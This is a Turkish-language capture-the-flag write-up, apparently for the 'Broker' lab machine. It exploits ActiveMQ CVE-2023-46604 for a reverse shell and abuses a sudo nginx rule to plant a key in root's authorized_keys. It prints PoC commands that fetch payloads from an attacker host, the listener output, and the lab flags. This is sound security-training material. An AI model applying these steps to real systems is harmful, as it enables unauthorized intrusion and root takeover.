<img width="1032" height="928" alt="broker" src="https://github.com/user-attachments/assets/70b96d2d-e4ee-4788-ac2c-d29c5c0e32be" />

### About

Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access.

### 1. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.230.87
```

<img width="1053" height="832" alt="nmap" src="https://github.com/user-attachments/assets/0d0adaab-cdc1-441b-8329-d411b8ab6df4" />

<img width="515" height="26" alt="nmap2" src="https://github.com/user-attachments/assets/8087e835-4c29-45ce-b16e-dba6458ca380" />

61616'daki `ActiveMQ OpenWire transport 5.15.15` banner'ı bilinen ve kritik bir RCE zincirine işaret ediyor.

### 2. Web Servisi ve ActiveMQ Console

<img width="876" height="441" alt="site1" src="https://github.com/user-attachments/assets/f62d64e8-dd89-4505-9a8f-e000771f0b88" />

80. portta `ActiveMQRealm` realm'ıyla bir Basic Auth diyaloğu var. `admin:admin` ile içeri giriyoruz.

<img width="680" height="645" alt="site2" src="https://github.com/user-attachments/assets/9be7cf46-0c9e-4aac-9d70-21559f2df31c" />

Konsol broker'ın tam sürümünü doğruluyor: `5.15.15`.

### 3. Foothold — CVE-2023-46604

`ActiveMQ 61613 exploit` aramasıyla CVE-2023-46604'e ulaşıyoruz. PoC için şu repoyu kullanıyoruz:

**https://github.com/Strikoder-Premium/CVE-2023-46604-ActiveMQ-RCE-Python**

61616 portundaki OpenWire protokolü, ActiveMQ'nun kendi ikili mesajlaşma protokolüdür ve mesajları **marshalling/unmarshalling** ile serileştirir. Zafiyetin kökü `BaseDataStreamMarshaller` sınıfında: gelen bir `ExceptionResponse` paketi işlenirken, paket içinde taşınan **sınıf ismi reflection ile doğrudan instantiate edilir** — hangi sınıfın oluşturulacağı sunucu tarafından sabitlenmemiş, saldırganın gönderdiği veriden okunuyor. OpenWire seviyesindeki mesaj işleme HTTP/Basic Auth'un tamamen dışında, ham TCP soketi üzerinde gerçekleştiği için kimlik doğrulaması hiç devreye girmiyor.

Gadget olarak `org.springframework.context.support.ClassPathXmlApplicationContext` kullanılıyor — bu sınıfın constructor'ı kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çekiyor ve içindeki bean tanımlarını anında instantiate ediyor. Attacker-controlled XML içinde `ProcessBuilder`/`Runtime.exec()` çağıran bir bean tanımlanırsa, bean'in constructor'ı çalıştığı an komut çalışır.

```bash
python3 generate_poc.py -i 10.10.14.187 -p 1001
```

Bu adım, saldırgan makinesinin dinleyeceği IP/portu gömen reverse shell komutunu Spring context XML'inin içine yerleştirip `poc-linux.xml` olarak yazıyor.

```bash
python3 -m http.server 2002
python3 main.py -i 10.129.230.87 -u http://10.10.14.187:2002/poc-linux.xml
```

`main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp marshalling katmanını istismar eden ham paketi gönderiyor — payload'ın merkezinde `ClassPathXmlApplicationContext` sınıf ismi ve bizim HTTP sunucumuzda barındırdığımız XML'in URL'i encode edilmiş halde taşınıyor. ActiveMQ paketi aldığı anda XML'i çekiyor, Spring context'i inşa ediyor, context inşası sırasında komutumuz çalışıyor.

```
nc -nvlp 1001
connect to [10.10.14.187] from (UNKNOWN) [10.129.230.87] 42702
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

Broker process'i `activemq` kullanıcısı yetkisiyle çalıştığı için shell doğrudan bu kullanıcı bağlamında.

```
activemq@broker:~$ cat user.txt
35aa58f0993e0867e3daef939ccf22ee
```

### 4. Privilege Escalation — nginx Sudo Misconfiguration

```
activemq@broker:~$ sudo -l
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Kural tek bir binary'ye izin veriyor gibi görünse de argüman kısıtlaması yok — nginx `-c` ile keyfi bir konfigürasyon dosyası kabul eder. Root yetkisiyle çalışacak bir web sunucusunu kendi config'imizle başlatabilmek, root context'inde dosya sistemi üzerinde işlem yaptırabilmek anlamına geliyor. GTFOBins'te nginx için bir entry var ama kullanımı ilk bakışta net değildi, bu yüzden ayrıca aratıp şu repoya ulaştım:

**https://github.com/DylanGrl/nginx_sudo_privesc**

```bash
activemq@broker:/tmp$ wget http://10.10.14.187:8000/exploit.sh
--2026-09-02 11:01:38--  http://10.10.14.187:8000/exploit.sh
Connecting to 10.10.14.187:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 622 [application/x-sh]
Saving to: 'exploit.sh'
exploit.sh          100%[===================>]     622  --.-KB/s    in 0s

activemq@broker:/tmp$ chmod +x exploit.sh
activemq@broker:/tmp$ ./exploit.sh
[+] Creating configuration...
[+] Loading configuration...
[+] Generating SSH Key...
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa):
Created directory '/home/activemq/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/activemq/.ssh/id_rsa
Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:4twMk7aA/Uk9uefpJl9aeUlq+68qQvDlasUQtVsGTpY activemq@broker
[+] Display SSH Private Key for copy...
cat: .ssh/id_rsa: No such file or directory
[+] Add key to root user...
cat: .ssh/id_rsa.pub: No such file or directory
[+] Use the SSH key to get access
```

Script özünde şunu yapıyor: bir SSH anahtar çifti üretiyor, ardından nginx'i root yetkisiyle, ürettiğimiz public key'i root'un `authorized_keys` dosyasına yazacak şekilde ayarlanmış bir config ile `sudo /usr/sbin/nginx -c <malicious.conf>` olarak başlatıyor. Mekanizma, nginx'in `root`/`alias` ve log directive'lerinin, sudo ile root yetkisi kazanan bir process içinde erişim kontrolü dışında kalan dosya yollarına yazma imkânı sunmasına dayanıyor — About kısmında referans verilen Zimbra advisory'siyle aynı sınıf açık. Script'in kendi çıktısındaki `cat: .ssh/id_rsa: No such file or directory` hataları kozmetik; script relative path ile dosyayı okumaya çalışıp bulamıyor ama asıl işlemi (key üretimi + authorized_keys enjeksiyonu) yine de tamamlıyor.

```
activemq@broker:~/.ssh$ ls
id_rsa  id_rsa.pub
```

Kendi `.ssh` dizinimizde üretilen anahtar çiftini buluyoruz — bu, root'un `authorized_keys`'ine enjekte edilen public key'in eşi. Private key'i Kali tarafına taşıyoruz:

```bash
nano root_key
chmod 600 root_key
ssh -i root_key root@10.129.230.87
```

```
root@broker:~# cat root.txt
2b52eb54831f5f7b5c2098bf30abaa4e
```
